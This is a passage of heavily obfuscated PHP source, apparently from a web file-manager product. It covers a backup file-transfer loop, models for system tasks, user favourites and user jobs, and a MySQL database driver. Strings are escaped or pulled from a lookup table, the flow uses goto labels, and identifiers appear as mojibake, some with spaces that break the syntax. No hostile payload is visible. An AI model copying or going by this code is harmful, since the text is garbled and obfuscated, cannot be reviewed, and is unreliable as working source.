Model($_SERVER[ Ö‘ñÄ”][802])->where($»à•›ÍÄ)->count($_SERVER[ Ö‘ñÄ”][476]); $àÜ’…À¬ = (int) Model($_SERVER[ Ö‘ñÄ”][802])->where($»à•›ÍÄ)->sum($_SERVER[ Ö‘ñÄ”][76]); $å˜üµÜ = new TaskFileTransfer($_SERVER[ Ö‘ñÄ”][822], $_SERVER[ Ö‘ñÄ”][793], $¨ıÑñ˜ç, LNG($_SERVER[ Ö‘ñÄ”][794]) . $_SERVER[ Ö‘ñÄ”][795] . LNG($_SERVER[ Ö‘ñÄ”][823])); $å˜üµÜ->task[$_SERVER[ Ö‘ñÄ”][776]] = $àÜ’…À¬; $âïüİŞ = array($_SERVER[ Ö‘ñÄ”][824] => $¨ıÑñ˜ç, $_SERVER[ Ö‘ñÄ”][825] => $àÜ’…À¬, $_SERVER[ Ö‘ñÄ”][826] => time()); Backup::set($âïüİŞ); $‡‡¼·ìÓ = !0; $¦»õÉ½‰ = $this->storeIds(); $û¸¸¶Ÿî = 1; $§ñ™Òİ‘ = 1000; $æèÓÅò = $ïíÔ = 0; $À§¦éİÄ = array(); $Ã“ŸĞ™è = $¿ıåâ¸ = 0; do { $ÙôÑÈàÇ = $_SERVER[ Ö‘ñÄ”][827]; $áöÙ•­® = Model($_SERVER[ Ö‘ñÄ”][802])->where($»à•›ÍÄ)->field($ÙôÑÈàÇ)->order($_SERVER[ Ö‘ñÄ”][828])->selectPage($§ñ™Òİ‘, $û¸¸¶Ÿî); $‹³Ñ³ËÜ = !empty($áöÙ•­®[$_SERVER[ Ö‘ñÄ”][378]]) ? $áöÙ•­®[$_SERVER[ Ö‘ñÄ”][378]] : array(); foreach ($‹³Ñ³ËÜ as $ã­ãôÚ) { if (!$this->_fileExist($ã­ãôÚ, $À§¦éİÄ, $¦»õÉ½‰)) { $¨ıÑñ˜ç -= 1; $àÜ’…À¬ -= (int) $ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][76]]; write_log("\146\151\154\x65\x20\x6e\x6f\x74\x20\145\x78\x69\x73\x74\56\x66\x69\x6c\x65\x49\x44\72{$ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][476]]}\x2c\x20\160\x61\x74\150\72{$ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][84]]}", $_SERVER[ Ö‘ñÄ”][829]); continue; } $¥Ÿ¦È¿ = $ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][84]]; $ª÷Õ’Şø = "\173\x69\x6f\x3a{$Ãûİ×¹²[$_SERVER[ Ö‘ñÄ”][765]]}\175" . substr($¥Ÿ¦È¿, strlen("\173\151\157\72{$ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][830]]}\175")); if (IO::exist($ª÷Õ’Şø)) { $å˜üµÜ->updateFileEnd($ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][32]], $ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][76]]); } else { $ª÷Õ’Şø = get_path_father($ª÷Õ’Şø); IO::mkdir($ª÷Õ’Şø); if (!IO::copy($¥Ÿ¦È¿, $ª÷Õ’Şø, $_SERVER[ Ö‘ñÄ”][831])) { write_log($_SERVER[ Ö‘ñÄ”][832] . $¥Ÿ¦È¿ . $_SERVER[ Ö‘ñÄ”][816] . $ª÷Õ’Şø . $_SERVER[ Ö‘ñÄ”][164], $_SERVER[ Ö‘ñÄ”][793]); $‡‡¼·ìÓ = !1; break; } } $­¿‹Ùíö = $ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][476]]; $ïíÔ += 1; $æèÓÅò += $ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][76]]; $¿ıåâ¸ += 1; $Ã“ŸĞ™è += $ã­ãôÚ[$_SERVER[ Ö‘ñÄ”][76]]; if ($æèÓÅò >= 1024 * 1024 * 100) { $âïüİŞ = array($_SERVER[ Ö‘ñÄ”][833] => $­¿‹Ùíö, $_SERVER[ Ö‘ñÄ”][834] => $¿ıåâ¸, $_SERVER[ Ö‘ñÄ”][835] => $Ã“ŸĞ™è); Backup::set($âïüİŞ); $æèÓÅò = $ïíÔ = 0; } } $Ç¿¶¼¹’ = count($‹³Ñ³ËÜ); $û¸¸¶Ÿî++; } while ($Ç¿¶¼¹’ == $§ñ™Òİ‘); $å˜üµÜ->end(); $âïüİŞ = array($_SERVER[ Ö‘ñÄ”][836] => 1, $_SERVER[ Ö‘ñÄ”][505] => time(), $_SERVER[ Ö‘ñÄ”][788] => 1, $_SERVER[ Ö‘ñÄ”][833] => $­¿‹Ùíö, $_SERVER[ Ö‘ñÄ”][825] => $àÜ’…À¬, $_SERVER[ Ö‘ñÄ”][824] => $¨ıÑñ˜ç, $_SERVER[ Ö‘ñÄ”][837] => time()); if ($ïíÔ) { $âïüİŞ[$_SERVER[ Ö‘ñÄ”][834]] = $¿ıåâ¸; $âïüİŞ[$_SERVER[ Ö‘ñÄ”][835]] = $Ã“ŸĞ™è; } Backup::set($âïüİŞ); $this->_fileFilter($À§¦éİÄ); return !0; } private function _fileExist($õæíà“, &$ş„²¤úª, $³ƒ‹’¢„) { $ø€õ®öû =& $_SERVER[ Ö‘ñÄ”]; $ö•Í‚×µ = $õæíà“[$ø€õ®öû[84]]; if (in_array($õæíà“[$ø€õ®öû[476]], $ş„²¤úª)) { return !1; } if (!in_array($õæíà“[$ø€õ®öû[830]], $³ƒ‹’¢„)) { return !1; } if (IO::exist($ö•Í‚×µ)) { return !0; } $Ô·ø™ = get_path_father($ö•Í‚×µ); if (IO::exist($Ô·ø™)) { $ş„²¤úª[] = $õæíà“[$ø€õ®öû[476]]; return !1; } $€åÑô… = array($ø€õ®öû[830] => $õæíà“[$ø€õ®öû[830]], $ø€õ®öû[84] => array($ø€õ®öû[391], "{$Ô·ø™}\45")); $¾îÀî¬Ô = Model($ø€õ®öû[802])->where($€åÑô…)->field($ø€õ®öû[477])->select(); $ş„²¤úª = array_merge($ş„²¤úª, array_to_keyvalue($¾îÀî¬Ô, $ø€õ®öû[12], $ø€õ®öû[476])); return !1; } private function _fileFilter($¬¢¼Çø§) { $è÷ƒÛ›Ø =& $_SERVER[ Ö‘ñÄ”]; if (empty($¬¢¼Çø§)) { return; } $÷š‚â´ = array($è÷ƒÛ›Ø[476] => array($è÷ƒÛ›Ø[7], array_unique($¬¢¼Çø§))); $ºÍÂ§ì° = Model($è÷ƒÛ›Ø[838])->where($÷š‚â´)->field($è÷ƒÛ›Ø[410])->select(); foreach ($ºÍÂ§ì° as $õÛ¡Ô¹´) { Model($è÷ƒÛ›Ø[838])->remove($õÛ¡Ô¹´[$è÷ƒÛ›Ø[410]], !1); } } private function storeIds() { $õ¨¼Œ• =& $_SERVER[ Ö‘ñÄ”]; $§ÔñÕ› = Model($õ¨¼Œ•[780])->listData(); $Êó”œÁú = array(); $ôîÀ©•… = $GLOBALS[$õ¨¼Œ•[6]][$õ¨¼Œ•[89]][$õ¨¼Œ•[839]]; foreach ($§ÔñÕ› as $Ûçàª†ß) { $‘ÑÊ£Ç» = strtolower($Ûçàª†ß[$õ¨¼Œ•[95]]); if (!isset($ôîÀ©•…[$‘ÑÊ£Ç»])) { continue; } $ç°‘“ê = $õ¨¼Œ•[74] . (isset($ôîÀ©•…[$‘ÑÊ£Ç»]) ? $ôîÀ©•…[$‘ÑÊ£Ç»] : ucfirst($‘ÑÊ£Ç»)); if (!class_exists($ç°‘“ê)) { continue; } $Êó”œÁú[] = $Ûçàª†ß[$õ¨¼Œ•[407]]; } return $Êó”œÁú; } } goto C“¬°Ú¨¿¤; fª¾©í¶Ó©: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\164\141\163\x6b\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\164\x79\160\x65", "\x65\x76\x65\x6e\164", "\x74\151\x6d\145", "\x64\x65\x73\x63", "\x73\x79\163\x74\145\155", "\145\x6e\141\142\154\145", "\x6c\141\163\164\x52\x75\156", "\163\157\x72\x74"); public function listData($¼ÈáÎø¶ = false, $ç¢Ü½Š® = "\163\x6f\162\x74", $º£»Èè³ = false) { return parent::listData($¼ÈáÎø¶, $ç¢Ü½Š®, $º£»Èè³); } public function add($ŞŞËšÃ¼) { $×¤Ì–÷ğ =& $_SERVER[ Ö‘ñÄ”]; $Ôñ¶ƒ­÷ = $this->findByName($ŞŞËšÃ¼[$×¤Ì–÷ğ[32]]); if ($Ôñ¶ƒ­÷) { return !1; } $ŞŞËšÃ¼[$×¤Ì–÷ğ[1623]] = 0; $ŞŞËšÃ¼[$×¤Ì–÷ğ[1860]] = $this->getSort(); return parent::insert($ŞŞËšÃ¼); } private function getSort() { $á¢·’ÜÏ =& $_SERVER[ Ö‘ñÄ”]; $°éÉŒİ = parent::listData(); $¹ßöÏŒï = array_to_keyvalue($°éÉŒİ, $á¢·’ÜÏ[12], $á¢·’ÜÏ[1860]); return empty($¹ßöÏŒï) ? 0 : max($¹ßöÏŒï) + 1; } public function update($ø³üµ±¹, $ß÷”í¢) { $•Áßï¿ =& $_SERVER[ Ö‘ñÄ”]; $Ğ¨ü…½» = $this->listData($ø³üµ±¹); $¦¬¢ÃË” = $this->findByName($ß÷”í¢[$•Áßï¿[32]]); if (!$Ğ¨ü…½» || $¦¬¢ÃË” && $¦¬¢ÃË”[$•Áßï¿[407]] != $Ğ¨ü…½»[$•Áßï¿[407]]) { return !1; } return parent::update($ø³üµ±¹, $ß÷”í¢); } public function remove($ç’çùí‘, $›ºàúò = false) { $œÖ‹ÉÃ =& $_SERVER[ Ö‘ñÄ”]; $ƒ£€ö§ = $this->listData($ç’çùí‘); if (!$ƒ£€ö§) { return; } if (!$›ºàúò && $ƒ£€ö§[$œÖ‹ÉÃ[1282]] == $œÖ‹ÉÃ[88]) { return !1; } return parent::remove($ç’çùí‘); } public function enable($–ÖÄÊëà, $øÄÓƒîÎ) { return $this->update($–ÖÄÊëà, array($_SERVER[ Ö‘ñÄ”][2263] => $øÄÓƒîÎ)); } public function run($ó©Ÿ¹êÀ) { return $this->update($ó©Ÿ¹êÀ, array($_SERVER[ Ö‘ñÄ”][2275] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($¯†ı›şŒ) { $¡ÎŞäí =& $_SERVER[ Ö‘ñÄ”]; return array($¡ÎŞäí[1947] => array(USER_ID, $¡ÎŞäí[2276])); } protected function listData() { $¹Ï¦ĞŸô =& $_SERVER[ Ö‘ñÄ”]; $­åÑÅ = array($¹Ï¦ĞŸô[1654] => USER_ID, $¹Ï¦ĞŸô[492] => 0); $ÔÚ‹Ë® = $¹Ï¦ĞŸô[2277]; $Õ¯Ì—íÉ = $this->field($ÔÚ‹Ë®)->where($­åÑÅ)->order($¹Ï¦ĞŸô[2278])->select(); return $Õ¯Ì—íÉ ? $Õ¯Ì—íÉ : array(); } protected function resetCache() { } protected function listView() { $Ì‡ù³º =& $_SERVER[ Ö‘ñÄ”]; $Ï™ŞùñÌ = $this->listData(); $íÖÁ™íî = array_filter_by_field($Ï™ŞùñÌ, $Ì‡ù³º[33], $Ì‡ù³º[424]); $ìĞÍã¶… = array_to_keyvalue($íÖÁ™íî, $Ì‡ù³º[12], $Ì‡ù³º[84]); if (!$ìĞÍã¶…) { return $Ï™ŞùñÌ; } $¬İÀÅá¦ = 2000; $ÇùÖÒŞ = array($Ì‡ù³º[425] => array($Ì‡ù³º[426], $ìĞÍã¶…)); $¸ÙåŒİ = Model($Ì‡ù³º[838])->listSource($ÇùÖÒŞ, $¬İÀÅá¦); $¸ÙåŒİ = array_merge($¸ÙåŒİ[$Ì‡ù³º[83]], $¸ÙåŒİ[$Ì‡ù³º[82]]); $¸ÙåŒİ = array_to_keyvalue($¸ÙåŒİ, $Ì‡ù³º[410]); foreach ($Ï™ŞùñÌ as $º€¡•Â‘ => $¸øÖ¿ÕÈ) { $Ê’Úèá = $¸ÙåŒİ[$¸øÖ¿ÕÈ[$Ì‡ù³º[84]]]; $Ê’Úèá = $Ê’Úèá ? $Ê’Úèá : array(); $Ï™ŞùñÌ[$º€¡•Â‘] = array_merge($Ê’Úèá, $¸øÖ¿ÕÈ); } return $Ï™ŞùñÌ; } protected function addFav($ú²ı¤ĞÚ, $ªŠÎõ„Ô = '', $ÄŒÃÔÁ¸ = "\x73\x6f\165\x72\x63\x65") { $äØ¥Òî =& $_SERVER[ Ö‘ñÄ”]; $Îè»üä = array($äØ¥Òî[1654] => USER_ID, $äØ¥Òî[492] => 0, $äØ¥Òî[430] => $ÄŒÃÔÁ¸, $äØ¥Òî[429] => $ú²ı¤ĞÚ); if ($this->where($Îè»üä)->find()) { return !1; } $Îè»üä = array($äØ¥Òî[1654] => USER_ID, $äØ¥Òî[492] => 0); $úÅ‘µè³ = $this->where($Îè»üä)->max($äØ¥Òî[1860]); if (!$úÅ‘µè³) { $úÅ‘µè³ = 0; } if (!$ªŠÎõ„Ô && $ÄŒÃÔÁ¸ == $äØ¥Òî[424]) { $Ñ¾¬Ü™ = Model($äØ¥Òî[1333])->where(array($äØ¥Òî[425] => $ú²ı¤ĞÚ))->find(); if (!$Ñ¾¬Ü™) { return !1; } $ªŠÎõ„Ô = $Ñ¾¬Ü™[$äØ¥Òî[32]]; } $ªŠÎõ„Ô = $this->getAutoName($ªŠÎõ„Ô); $Ö¨ßæà = array($äØ¥Òî[1654] => USER_ID, $äØ¥Òî[492] => 0, $äØ¥Òî[428] => $ªŠÎõ„Ô, $äØ¥Òî[429] => $ú²ı¤ĞÚ, $äØ¥Òî[430] => $ÄŒÃÔÁ¸, $äØ¥Òî[1840] => $úÅ‘µè³ + 1); return $this->add($Ö¨ßæà); } protected function remove($’Ùµš) { $ƒÅİ«Ö— =& $_SERVER[ Ö‘ñÄ”]; $¬ƒŞÇÂ = array($ƒÅİ«Ö—[1654] => USER_ID, $ƒÅİ«Ö—[427] => $’Ùµš); return $this->where($¬ƒŞÇÂ)->delete(); } protected function removeByName($êô›î‡•) { $÷ÌÎÒÍ£ =& $_SERVER[ Ö‘ñÄ”]; $íËµëÌƒ = array($÷ÌÎÒÍ£[1654] => USER_ID, $÷ÌÎÒÍ£[428] => $êô›î‡•, $÷ÌÎÒÍ£[492] => 0); return $this->where($íËµëÌƒ)->delete(); } protected function rename($•¿šìÒ¯, $ãåã¨—ğ) { $ŞÁßùã³ =& $_SERVER[ Ö‘ñÄ”]; if ($•¿šìÒ¯ == $ãåã¨—ğ) { return !1; } $å„âÅï = $this->getAutoName($ãåã¨—ğ); if ($ãåã¨—ğ != $å„âÅï) { return !1; } $œĞİÌïš = array($ŞÁßùã³[1654] => USER_ID, $ŞÁßùã³[492] => 0, $ŞÁßùã³[32] => $•¿šìÒ¯); return $this->where($œĞİÌïš)->save(array($ŞÁßùã³[32] => $ãåã¨—ğ)); } protected function resetSort($Ã¡¦ç×¶) { $üÛÕ™Ú» =& $_SERVER[ Ö‘ñÄ”]; $Ã¡¦ç×¶ = is_array($Ã¡¦ç×¶) ? $Ã¡¦ç×¶ : array(); $šâ‹ïÀ² = array($üÛÕ™Ú»[1654] => USER_ID); for ($°Úû¡Ãü = 0; $°Úû¡Ãü < count($Ã¡¦ç×¶); $°Úû¡Ãü++) { $šâ‹ïÀ²[$üÛÕ™Ú»[427]] = $Ã¡¦ç×¶[$°Úû¡Ãü]; $this->where($šâ‹ïÀ²)->save(array($üÛÕ™Ú»[1840] => $°Úû¡Ãü + 1)); } return !0; } protected function moveTop($©¦®»…Î) { $ÃÅ×–Å­ =& $_SERVER[ Ö‘ñÄ”]; $êô¸˜‚È = array($ÃÅ×–Å­[1654] => USER_ID, $ÃÅ×–Å­[492] => 0); $ö˜Ú‰´‚ = $this->where($êô¸˜‚È)->where(array($ÃÅ×–Å­[32] => $©¦®»…Î))->find(); if (!$ö˜Ú‰´‚) { return; } $ìÁş¿¡ = $this->field($ÃÅ×–Å­[407])->where($êô¸˜‚È)->order($ÃÅ×–Å­[2278])->select(); $ìÁş¿¡ = array_to_keyvalue($ìÁş¿¡, $ÃÅ×–Å­[12], $ÃÅ×–Å­[407]); $¡ÕŞ´Ê = $ìÁş¿¡; $ìÁş¿¡ = array_remove_value($ìÁş¿¡, $ö˜Ú‰´‚[$ÃÅ×–Å­[407]]); array_unshift($ìÁş¿¡, $ö˜Ú‰´‚[$ÃÅ×–Å­[407]]); return $this->resetSort($ìÁş¿¡); } protected function moveBottom($ã‚£Ûî) { $¶ôÊåœë =& $_SERVER[ Ö‘ñÄ”]; $ãòòª•Ì = array($¶ôÊåœë[1654] => USER_ID, $¶ôÊåœë[492] => 0); $Ï¡¬™· = $this->where($ãòòª•Ì)->max($¶ôÊåœë[1860]); $ó·„¼Ùì = array($¶ôÊåœë[1860] => $Ï¡¬™· + 1); return $this->where($ãòòª•Ì)->where(array($¶ôÊåœë[32] => $ã‚£Ûî))->save($ó·„¼Ùì); } private function getAutoName($å®°İˆ) { $ÍÀìßğÍ =& $_SERVER[ Ö‘ñÄ”]; $Şª³® = array($ÍÀìßğÍ[1654] => USER_ID, $ÍÀìßğÍ[492] => 0); $ÈŠ°õ¾ê = $this->field($ÍÀìßğÍ[32])->where($Şª³®)->select(); $ÈŠ°õ¾ê = array_to_keyvalue($ÈŠ°õ¾ê, $ÍÀìßğÍ[12], $ÍÀìßğÍ[32]); if (!$ÈŠ°õ¾ê || !in_array($å®°İˆ, $ÈŠ°õ¾ê)) { return $å®°İˆ; } for ($ÊÔÏõ½º = 0; $ÊÔÏõ½º < count($ÈŠ°õ¾ê); $ÊÔÏõ½º++) { if (!in_array($å®°İˆ . "\50{$ÊÔÏõ½º}\51", $ÈŠ°õ¾ê)) { return $å®°İˆ . "\x28{$ÊÔÏõ½º}\x29"; } } return $å®°İˆ . "\x28{$ÊÔÏõ½º}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x6a\x6f\x62\114\151\x73\164"; public $field = array("\156\x61\155\x65", "\144\145\163\x63", "\163\x6f\x72\x74"); const JOB_KEY = "\163\145\154\146\112\157\142\114\x69\163\164"; public function listData($ñ€‚ûˆÈ = false, $×ÈâµÃ¤ = "\163\157\x72\x74", $ÕùÚØ·Å = false) { return parent::listData($ñ€‚ûˆÈ, $×ÈâµÃ¤, $ÕùÚØ·Å); } public function remove($Åçø¸¡ë) { return parent::remove($Åçø¸¡ë); } public function add($“ç“ˆæ„) { $¶•ªô­ =& $_SERVER[ Ö‘ñÄ”]; if ($this->findByName($“ç“ˆæ„[$¶•ªô­[32]])) { return !1; } $“ç“ˆæ„[$¶•ªô­[1860]] = $this->getSort(); return parent::insert($“ç“ˆæ„); } private function getSort() { $Îœæ×ìÍ =& $_SERVER[ Ö‘ñÄ”]; $‹¯‡ã« = parent::listData(); $ÚİÏç©Ò = array_to_keyvalue($‹¯‡ã«, $Îœæ×ìÍ[12], $Îœæ×ìÍ[1860]); return empty($ÚİÏç©Ò) ? 0 : max($ÚİÏç©Ò) + 1; } public function update($‡ ×èíş, $Œ©¾¶ã˜) { $µâØ¨é =& $_SERVER[ Ö‘ñÄ”]; $ÑÑîôù¡ = parent::listData($‡ ×èíş); $×îäÊÃ£ = $this->findByName($Œ©¾¶ã˜[$µâØ¨é[32]]); if (!$ÑÑîôù¡ || $×îäÊÃ£ && $×îäÊÃ£[$µâØ¨é[407]] != $ÑÑîôù¡[$µâØ¨é[407]]) { return !1; } return parent::update($‡ ×èíş, $Œ©¾¶ã˜); } public function setUserJob($¨ÇØôû™, $ŠÔ¼ÂÍ„) { $åğ“£Ü =& $_SERVER[ Ö‘ñÄ”]; if (!is_array($ŠÔ¼ÂÍ„)) { $ŠÔ¼ÂÍ„ = array($ŠÔ¼ÂÍ„); } $Õİ«ôŠÅ = parent::listData(); $Ú—İ¢±Ÿ = array_to_keyvalue($Õİ«ôŠÅ, $åğ“£Ü[32]); $Ù˜¢˜‹º = $åğ“£Ü[246]; foreach ($ŠÔ¼ÂÍ„ as $…Œ£óœ½) { if ($Ú—İ¢±Ÿ[$…Œ£óœ½]) { $Ù˜¢˜‹º .= $Ú—İ¢±Ÿ[$…Œ£óœ½][$åğ“£Ü[407]] . $åğ“£Ü[50]; } else { $ì¬Óñ±¨ = $this->add($…Œ£óœ½); $Ù˜¢˜‹º .= $ì¬Óñ±¨ . $åğ“£Ü[50]; } } $Ù˜¢˜‹º = rtrim($Ù˜¢˜‹º, $åğ“£Ü[50]); Model($åğ“£Ü[543])->metaSet($¨ÇØôû™, self::JOB_KEY, $Ù˜¢˜‹º); } public function getUserJob($ÇÁ„Üµß) { $³èÌÈÆ… = Model($_SERVER[ Ö‘ñÄ”][543])->metaGet($ÇÁ„Üµß); return $this->getUserJobInfo($³èÌÈÆ…[self::JOB_KEY]); } public function getUserJobInfo($—Ñ¨»‘¡) { $øÇÙÓÂ =& $_SERVER[ Ö‘ñÄ”]; $³ŒÍöòø = explode($øÇÙÓÂ[50], $—Ñ¨»‘¡); $ÚÃ¸ãÍ¢ = parent::listData(); $ÚÃ¸ãÍ¢ = array_remove_key($ÚÃ¸ãÍ¢, $øÇÙÓÂ[200]); $ûÁØÍĞö = array(); foreach ($³ŒÍöòø as $–Ñ¯Ôƒ) { if (isset($ÚÃ¸ãÍ¢[$–Ñ¯Ôƒ])) { $ûÁØÍĞö[] = $ÚÃ¸ãÍ¢[$–Ñ¯Ôƒ]; } } return $ûÁØÍĞö; } } goto Eîİö¥ìºâ; e¬‰ãá÷Âà: class DbMysql extends Db { public function __construct($•»ôÒ = '') { $–øÓ“õ =& $_SERVER[ Ö‘ñÄ”]; if (!extension_loaded($–øÓ“õ[817])) { think_exception(think_lang($–øÓ“õ[14]) . $–øÓ“õ[891]); } if (!empty($•»ôÒ)) { $this->config = $•»ôÒ; if (empty($this->config[$–øÓ“õ[17]])) { $this->config[$–øÓ“õ[17]] = $–øÓ“õ[12]; } } } public function connect($è¦Òâæ¥ = '', $Ã£åŠ“© = 0, $·˜¹Ìİ = false) { $‰æë£¦È =& $_SERVER[ Ö‘ñÄ”]; if (!isset($this->linkID[$Ã£åŠ“©])) { if (empty($è¦Òâæ¥)) { $è¦Òâæ¥ = $this->config; } $¡—òÊİ = $è¦Òâæ¥[$‰æë£¦È[892]] . ($è¦Òâæ¥[$‰æë£¦È[893]] ? "\x3a{$è¦Òâæ¥[$‰æë£¦È[893]]}" : $‰æë£¦È[12]); $Ûğ¿ü³¦ = !empty($è¦Òâæ¥[$‰æë£¦È[17]][$‰æë£¦È[18]]) ? $è¦Òâæ¥[$‰æë£¦È[17]][$‰æë£¦È[18]] : $this->pconnect; if ($Ûğ¿ü³¦) { $this->linkID[$Ã£åŠ“©] = mysql_pconnect($¡—òÊİ, $è¦Òâæ¥[$‰æë£¦È[894]], $è¦Òâæ¥[$‰æë£¦È[895]], 131072); } else { $this->linkID[$Ã£åŠ“©] = mysql_connect($¡—òÊİ, $è¦Òâæ¥[$‰æë£¦È[894]], $è¦Òâæ¥[$‰æë£¦È[895]], !0, 131072); } if (!$this->linkID[$Ã£åŠ“©] || !empty($è¦Òâæ¥[$‰æë£¦È[21]]) && !mysql_select_db($è¦Òâæ¥[$‰æë£¦È[21]], $this->linkID[$Ã£åŠ“©])) { think_exception(mysql_error()); } $¥¸ ªÚÉ = mysql_get_server_info($this->linkID[$Ã£åŠ“©]); mysql_query($‰æë£¦È[896] . think_config($‰æë£¦È[897]) . $‰æë£¦È[58], $this->linkID[$Ã£åŠ“©]); if ($¥¸ ªÚÉ > $‰æë£¦È[898]) { mysql_query($‰æë£¦È[899], $this->linkID[$Ã£åŠ“©]); } $this->connected = !0; if (1 != think_config($‰æë£¦È[22])) { unset($this->config); } } return $this->linkID[$Ã£åŠ“©]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($»ÇåĞ¦ˆ) { $ÊÍ„ğ Ş =& $_SERVER[ Ö‘ñÄ”]; if (0 === stripos($»ÇåĞ¦ˆ, $ÊÍ„ğ Ş[273])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»ÇåĞ¦ˆ; if ($this->queryID) { $this->free(); } think_action_status($ÊÍ„ğ Ş[23], 1); think_status($ÊÍ„ğ Ş[24]); $this->queryID = mysql_query($»ÇåĞ¦ˆ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($£º’èÒ±) { $¼ã›ÉÌ =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $£º’èÒ±; if ($this->queryID) { $this->free(); } think_action_status($¼ã›ÉÌ[25], 1); think_status($¼ã›ÉÌ[24]); $¸ƒÎú¸ = mysql_query($£º’èÒ±, $this->_linkID); $this->debug(); if (!1 === $¸ƒÎú¸) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ Ö‘ñÄ”][900], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ØĞ¶ÉÀ´ = mysql_query($_SERVER[ Ö‘ñÄ”][901], $this->_linkID); $this->transTimes = 0; if (!$ØĞ¶ÉÀ´) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨”ë›âŞ = mysql_query($_SERVER[ Ö‘ñÄ”][902], $this->_linkID); $this->transTimes = 0; if (!$¨”ë›âŞ) { $this->error(); return !1; } } return !0; } private function getAll() { $â²¼Ö€ò = array(); if ($this->numRows > 0) { while ($‰Ò­¬ëû = mysql_fetch_assoc($this->queryID)) { $â²¼Ö€ò[] = $‰Ò­¬ëû; } mysql_data_seek($this->queryID, 0); } return $â²¼Ö€ò; } public function getFields($İõõ™„ª) { $ÒÒ¬é¶Ú =& $_SERVER[ Ö‘ñÄ”]; $ïª¾£¼ = $this->query($ÒÒ¬é¶Ú[903] . $this->parseKey($İõõ™„ª)); $æÄèù—Š = array(); if ($ïª¾£¼) { foreach ($ïª¾£¼ as $ß€’ªé¹ => $Áıä¹ï–) { $æÄèù—Š[$Áıä¹ï–[$ÒÒ¬é¶Ú[31]]] = array($ÒÒ¬é¶Ú[32] => $Áıä¹ï–[$ÒÒ¬é¶Ú[31]], $ÒÒ¬é¶Ú[33] => $Áıä¹ï–[$ÒÒ¬é¶Ú[34]], $ÒÒ¬é¶Ú[35] => (bool) (strtoupper($Áıä¹ï–[$ÒÒ¬é¶Ú[36]]) === $ÒÒ¬é¶Ú[904]), $ÒÒ¬é¶Ú[37] => $Áıä¹ï–[$ÒÒ¬é¶Ú[38]], $ÒÒ¬é¶Ú[39] => strtolower($Áıä¹ï–[$ÒÒ¬é¶Ú[40]]) == $ÒÒ¬é¶Ú[41], $ÒÒ¬é¶Ú[42] => strtolower($Áıä¹ï–[$ÒÒ¬é¶Ú[43]]) == $ÒÒ¬é¶Ú[44]); } } return $æÄèù—Š; } public function getTables($¥‚¡ÌÛ´ = '') { $šÆªàØÉ =& $_SERVER[ Ö‘ñÄ”]; if (!empty($¥‚¡ÌÛ´)) { $ü×¥øäŠ = $šÆªàØÉ[905] . $¥‚¡ÌÛ´ . $šÆªàØÉ[906]; } else { $ü×¥øäŠ = $šÆªàØÉ[907]; } $¢Š»† = $this->query($ü×¥øäŠ); $åËå £™ = array(); foreach ($¢Š»† as $Ä¦—ê¥ => $‚úóúÍÚ) { $åËå £™[$Ä¦—ê¥] = current($‚úóúÍÚ); } return $åËå £™; } public function replace($îá‹ÉìÛ, $¤ğõûïÍ = array()) { $ëüÖæ©Ï =& $_SERVER[ Ö‘ñÄ”]; foreach ($îá‹ÉìÛ as $·„îíĞ© => $ÛÕ½•–½) { $º’¼ıØ = $this->parseValue($ÛÕ½•–½); if (is_scalar($º’¼ıØ)) { $¢“ŒÁ©[] = $º’¼ıØ; $¼Î¥’Ó®[] = $this->parseKey($·„îíĞ©); } } $Ñì¡µšŞ = $ëüÖæ©Ï[908] . $this->parseTable($¤ğõûïÍ[$ëüÖæ©Ï[288]]) . $ëüÖæ©Ï[909] . implode($ëüÖæ©Ï[50], $¼Î¥’Ó®) . $ëüÖæ©Ï[910] . implode($ëüÖæ©Ï[50], $¢“ŒÁ©) . $ëüÖæ©Ï[911]; return $this->execute($Ñì¡µšŞ); } public function insertAll($Á’„÷š×, $Ó³À³òå = array(), $šâÆ×š = false) { $Í¨ìåéâ =& $_SERVER[ Ö‘ñÄ”]; if (!is_array($Á’„÷š×[0])) { return !1; } $³Ş«ËÈ = array_keys($Á’„÷š×[0]); $æÎÏ¨´ = array(); foreach ($Á’„÷š× as $“ÂïåÀ—) { $é˜§œğ = array(); foreach ($“ÂïåÀ— as $‡¿Úâóî => $ÑÊøœª) { $ÑÊøœª = $this->parseValue($ÑÊøœª); if (is_scalar($ÑÊøœª)) { $é˜§œğ[] = $ÑÊøœª; } } $æÎÏ¨´[] = $Í¨ìåéâ[269] . implode($Í¨ìåéâ[50], $é˜§œğ) . $Í¨ìåéâ[911]; } array_walk($³Ş«ËÈ, array($this, $Í¨ìåéâ[912])); $ùöûó€Ö = ($šâÆ×š ? $Í¨ìåéâ[913] : $Í¨ìåéâ[914]) . $Í¨ìåéâ[915] . $this->parseTable($Ó³À³òå[$Í¨ìåéâ[288]]) . $Í¨ìåéâ[909] . implode($Í¨ìåéâ[50], $³Ş«ËÈ) . $Í¨ìåéâ[916] . implode($Í¨ìåéâ[50], $æÎÏ¨´); return $this->execute($ùöûó€Ö); } public function close() { if ($this->_linkID) { 